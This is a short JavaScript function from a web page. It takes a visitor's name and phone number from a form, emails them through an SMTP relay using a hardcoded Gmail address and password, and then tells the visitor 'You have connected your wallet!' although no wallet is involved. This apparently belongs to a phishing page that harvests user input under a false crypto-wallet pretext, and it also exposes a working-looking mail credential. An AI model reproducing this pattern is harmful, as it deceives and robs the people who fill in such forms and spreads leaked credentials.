function emailSend(){

	var userName = document.getElementById('name').value;
	var phone = document.getElementById('phone').value;

	var messageBody = "Name " + userName +
	"<br/> Phone " + phone;
	Email.send({
    Host : "smtp.elasticemail.com",
    Username : "ibrahimaalpha870@gmail.com",
    Password : "76C6412DDCE18E73E15DDF9CACD566F17414",
    To : 'info@mopasmining.com',
    From : "ibrahimaalpha870@gmail.com",
    Subject : "This is the subject",
    Body : messageBody
}).then(
  message => {
  	if(message=='OK'){
  		swal("Successful", "You have connected your wallet!", "success");
  	}
  	else{
  		swal("Error", "Failed!", "error");
  	}
  }
);
}